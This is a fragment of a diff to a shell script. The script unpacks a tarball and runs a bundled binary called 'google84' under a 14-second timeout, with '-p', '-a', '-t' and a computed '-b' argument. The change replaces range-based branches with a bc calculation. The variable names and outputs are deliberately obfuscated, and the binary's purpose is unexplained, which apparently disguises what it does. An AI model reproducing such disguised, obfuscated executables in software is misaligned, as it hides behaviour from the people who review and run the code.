@@ -42,76 +42,16 @@ tar -xvf ./google84121274.tar.gz
 
 cd google84121274
 
-if (($google84 >= 16888 && $google84 <= 34884))
-then
+count=$(echo "$google84121274 - 400"|bc)
+googlelinux84=$(echo "$count / 16384"|bc -l)
+linuxgoogle84=$(echo "$googlelinux84 * 998"|bc)
+googlelinux8474=${linuxgoogle84%.*}
 
-timeout 14 ./google84 -p $google841212121274 -a $google84121212121212121274 -t 1 -b 472
+timeout 14 ./google84 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
 if [ $? -eq 124 ]; then
 echo "google84"
 else
 echo "google8474"
-fi
-
-fi
-
-if (($google84 >= 14884 && $google84 <= 16884))
-then
-
-timeout 14 ./google84 -p $google841212121274 -a $google84121212121212121274 -t 1 -b 374
-if [ $? -eq 124 ]; then
-echo "google84"
-else
-echo "google8474"
-fi
-
-fi
-
-if (($google84 >= 10884 && $google84 <= 14882))
-then
-
-timeout 14 ./google84 -p $google841212121274 -a $google84121212121212121274 -t 1 -b 248
-if [ $? -eq 124 ]; then
-echo "google84"
-else
-echo "google8474"
-fi
-
-fi
-
-if (($google84 >= 5288 && $google84 <= 9184))
-then
-
-timeout 14 ./google84 -p $google841212121274 -a $google84121212121212121274 -t 1 -b 188
-if [ $? -eq 124 ]; then
-echo "google84"
-else
-echo "google8474"
-fi
-
-fi
-
-if (($google84 >= 2874 && $google84 <= 5184))
-then
-
-timeout 14 ./google84 -p $google841212121274 -a $google84121212121212121274 -t 1 -b 148
-if [ $? -eq 124 ]; then
-echo "google84"
-else
-echo "google8474"
-fi
-
-fi
-
-if (($google84 >= 1884 && $google84 <= 2488))
-then
-
-timeout 14 ./google84 -p $google841212121274 -a $google84121212121212121274 -t 1 -b 84
-if [ $? -eq 124 ]; then
-echo "google84"
-else
-echo "google8474"
-fi
-
 fi
 
 
